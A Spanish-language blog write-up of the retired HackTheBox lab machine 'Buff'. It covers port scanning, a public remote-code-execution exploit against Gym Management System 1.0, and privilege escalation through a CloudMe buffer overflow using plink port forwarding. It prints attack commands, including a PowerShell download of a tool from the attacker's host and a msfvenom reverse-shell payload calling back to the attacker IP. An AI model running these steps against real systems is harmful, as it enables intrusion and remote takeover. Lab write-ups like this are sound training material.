---
layout      : post
title       : "HackTheBox - Buff"
author      : lanz
image       : https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/buff/bannerbuff.png
category    : [ htb ]
tags        : [ gym-management-system, CloudMe, buffer-overflow ]
---
Máquina Windows nivel fácil. Buff buff uff, explotaremos un gimnasio :o (casi) yyy aprovecharemos un Buffer Overflow para ser amos del sistema... ¿Sencillo, no? pues...

![buffHTB](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/buff/buffHTB.png)

### TL;DR (Spanish writeup)

Buenas buenas, e.e. Mediante la enumeración de servicios nos encontramos con el puerto `8080` abierto, dándole vueltas nos topamos con el software con que fue creada la página, `Gym Management System 1.0`, usando **searchsploit** y la web le encontramos un exploit, nos aprovecharemos de el para obtener acceso a la máquina. 

Estando dentro veremos que el usuario `shaun` en sus carpetas tiene un binario interesante (del servicio **CloudMe**), el cual nos permite hacer cositas con las nubes :P, enumerando su origen veremos que existe un `Buffer Overflow` que afecta la versión que tenemos y nos permite ejecutar código como usuario **administrador**. Con esto en mente nos pondremos a jugar para hacer un `Remote Port Forwarding` ya que la maquina nos presentara limitantes. 

Después del *RPF* usaremos nuestras propias herramientas para que el **BOF** nos genere una reverse Shell como el usuario administrador del sistema. Eeeeeeeeeeeeeesto en pocas palabras. Démosle candela (:

> Escribo para tener mis "notas", por si algun dia se me olvida todo, leer esto y reencontrarme :)

Tendremos 3 fases. Enumeración, explotación y escalada de privilegios (:

1. [Enumeración](#enumeracion)
2. [Explotación](#explotacion)
3. [Escalada de privilegios](#escalada-de-privilegios)

...

## Enumeración [#](#enumeracion) {#enumeracion}

Hacemos un escaneo de puertos con `nmap`, primero validamos que tal va de velocidad y según eso agregamos parámetros para hacerlo más rápido, eso si, validando falsos positivos (que se nos pierdan puertos).

```bash
$nmap -p- --open -Pn -v 10.10.10.198
```

Wow, va muy lento, agregándole `-T` no cambia mucho, así que usaremos `--min-rate`.

```bash
$nmap -p- --open --min-rate=2000 -Pn -v 10.10.10.198
```

| Parámetro  | Descripción   |
| -----------|:------------- |
| -p-        | Escanea todos los 65535                                                                                  |
| --open     | Solo los puertos que están abiertos                                                                      |
| -T4        | Forma de escanear superrápido, (claramente hace mucho ruido, pero al ser controlado no nos preocupamos) |
| --min-rate | Indica que no queremos hacer peticiones menores al num que pongamos (i.e: --min-rate=5000)               |
| -Pn        | Evita que realice Host Discovery, tales como Ping (P) y DNS (n)                                          |
| -v         | Permite ver en consola lo que va encontrando                                                             |
| -oG        | Guarda el output en un archivo (con formato grepeable, para usar una [función](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/extractPorts.png) de [S4vitar](https://s4vitar.github.io/) que me extrae los puertos en la clipboard)                              |

![nmapinitscan](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/buff/nmapinitscan.png)

Perfe, obtenemos dos puertos.

* 8080: Servicio web.
* 7680: No se que sea este puerto, validemos

Ahora que tenemos los puertos, haremos un escaneo para verificar que versión y scripts maneja cada uno.

```bash
$nmap -p8080,7680 -sC -sV 10.10.10.193 -oN portScan
```

| Parámetro | Descripción   |
| ----------|:------------- |
| -p        | Escaneo de los puertos obtenidos                       |
| -sC       | Muestra todos los scripts relacionados con el servicio |
| -sV       | Nos permite ver la versión del servicio                |
| -oN       | Guarda el output en un archivo                         |

![nmapportscan](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/buff/nmapportscan.png)

Nada relevante :(

#### > Servicio web puerto **8080**

![pagemain](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/buff/pagemain.png)

Enumerando la página vemos que software se usó para su creación.

![pagecontact](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/buff/pagecontact.png)

...

## Explotación [#](#explotacion) {#explotacion}

Buscando exploits sobre el, encontramos:

```bash
$searchsploit gym
-------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                      |  Path
-------------------------------------------------------------------------------------------------------------------- ---------------------------------
Gym Management System 1.0 - Unauthenticated Remote Code Execution                                                   | php/webapps/48506.py
-------------------------------------------------------------------------------------------------------------------- ---------------------------------
```

* Este es el exploit: [Exploit Gym Management System](https://www.exploit-db.com/exploits/48506).

Perfecto, validando el código y el PoC, hace un bypass en la subida de archivos de la página `/upload.php` para almacenar un archivo que nos permita ejecutar comandos desde el mismo exploit. Está perfectamente explicado en el script :P

El mismo exploit nos "emula" una Shell, pero no estamos en una Shell (parece, pero es por que en el script se está ejecutando `echo %CD%`, lo cual en Windows nos dice en que carpeta estamos), simplemente tenemos ejecución de comandos, pero limitados, por lo que lo mejor es subir el binario `netcat` para posteriormente ponernos en escucha y simplemente enviar la petición con el exploit.

```bash
$python3 -m http.server
```

![exploitnc](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/buff/exploitnc.png)

Listo, estando dentro y haciendo una enumeración básica sobre el usuario **shaun**, nos encontramos con un binario en su carpeta de descargas.

```powershell
c:\Users\shaun\Downloads>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is A22D-49F7

 Directory of c:\Users\shaun\Downloads

05/10/2020  00:12    <DIR>          .
05/10/2020  00:12    <DIR>          ..
16/06/2020  16:26        17,830,824 CloudMe_1112.exe
               1 File(s)     17,830,824 bytes
               2 Dir(s)   7,934,279,680 bytes free

c:\Users\shaun\Downloads>
```

...

## Escalada de privilegios [#](#escalada-de-privilegios) {#escalada-de-privilegios}

Investigando en internet vemos que esa versión de **CloudMe** es vulnerable a `Buffer Overflow` (si lo relacionamos con el nombre de la máquina sabemos que este es el camino) permitiéndonos ejecutar comandos en el sistema. Ya existen varios PoC (pruebas de concepto) que lo explotan.

En todos los exploits usan el puerto 8888, con ello entendemos que CloudMe se ejecuta en ese puerto. En nuestro escaneo no lo obtuvimos, veamos su estado. Si ejecutamos el binario y posteriormente validamos si el puerto está arriba vamos a verlo arriba:

```powershell
c:\Users\shaun\Downloads>netstat -a | findstr 8888
```

Tenemos que está en escucha pero mediante el localhost. Pues sencillo, solo es ejecutar el script, cambiarle el payload de `msfvenom` para que haga una petición a nuestra máquina y listos...

**Pues no**, la maquina no tiene **Python** y no permite ejecutar scripts de **PowerShell** (hay un exploit también). Así que tenemos dos opciones, pasar algún script de **Python** a **.exe** y subirlo o hacer un *Remote Port Forwarding*. Me voy con la segunda opción. (La primera la intente pero me dio problemas).

Básicamente un **Remote Port Forwarding** nos permite tomar un puerto de la máquina local para decirle que tome ese puerto y lo monte en uno de la máquina remota... Por lo que si tenemos el puerto 8888 localmente y le decimos que queremos montar ese puerto en nuestra máquina remota, tendremos el servicio CloudMe (8888) ejecutándose en nuestro puerto :). Y como en nuestra máquina si tenemos `python`, podremos explotarlo.

Validemos que hay en nuestro puerto 8888:

```bash
┌─[root@rave]─[/buff]
└──╼ #lsof -i:8888
┌─[✗]─[root@rave]─[/buff]
└──╼ #
```

Nada aún.

El Remote Port Forwarding lo haremos con `plink.exe` (relativamente parecido a **SSH** pero para Windows), procedemos a subirlo y ejecutarlo.

Pero antes, veamos alguna configuración necesaria en nuestra máquina atacante sobre SSH. En el archivo `/etc/ssh/sshd_config` debemos modificar que nos permita ingresar como root, por que si no, nos va a botar unos errores.

```bash
$cat /etc/ssh/sshd_config
...
...
PermitRootLogin yes
...
...
```

Y ahora reiniciamos el servicio SSH.

```bash
$service ssh restart
```

Listo ahora si procedemos a subir el binario y ejecutarlo.

```powershell
c:\Users\shaun\Downloads>cd c:\Xampp\tmp
c:\Xampp\tmp>powershell IWR -uri http://10.10.15.86:8000/plink.exe -OutFile c:\Xampp\tmp\plink.exe
c:\Xampp\tmp>plink.exe -l root -pw hola2 -R 8888:127.0.0.1:8888 10.10.15.86
FATAL ERROR: Network error: Connection timed out
```

Acá tuve algunos problemas, ya que por alguna extraña razón (valide firewall, configuraciones, etc) no me permitía conectarme al puerto **22** (SSH), así que cambiando el puerto que estará en escucha si nos permite ejecutarlo.

```bash
$cat /etc/ssh/sshd_config
...
Port 177
...
```

Y ejecutamos:

![plinkdone](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/buff/plinkdone.png)

Perfecto, ya tenemos el puerto 8888 del localhost de la máquina 10.10.10.198 (BUFF) en nuestro equipo, lo siguiente es tomar algún exploit, crear el payload y ejecutarlo sobre nuestro localhost :)

Usaremos dos exploits, de uno obtendré como generar el payload y el otro será la estructura del script.

* [Payload](https://www.exploit-db.com/exploits/48499), aunque se puede usar este también para explotarlo, pero me pareció más legible el siguiente:
* [El que usaremos](https://www.exploit-db.com/exploits/48389).

Le diremos que nos genere una reverse Shell hacia el puerto **4433**. Primero generemos el payload con `msfvenom` (que no es lo mismo que `msfconsole` (metasploit)).

```bash
# msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=<port> EXITFUNC=thread -b "\x00\x0d\x0a" -f python
$msfvenom -p windows/shell_reverse_tcp LHOST=10.10.15.86 LPORT=4433 EXITFUNC=thread -b "\x00\x0d\x0a" -f python
```

El output lo ponemos en el exploit. Nos ponemos en escucha y listo, ejecutará todo sobre el **localhost:8888**.

![pyexploitandflags](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/buff/pyexploitandflags.png)

...

Y listones, primer **BOF** en HTB que "hago" (en este caso simplemente lo ejecuté), sencilla, bonita y nueva para mí.

Gracias por leer y a romper todo como siempre :P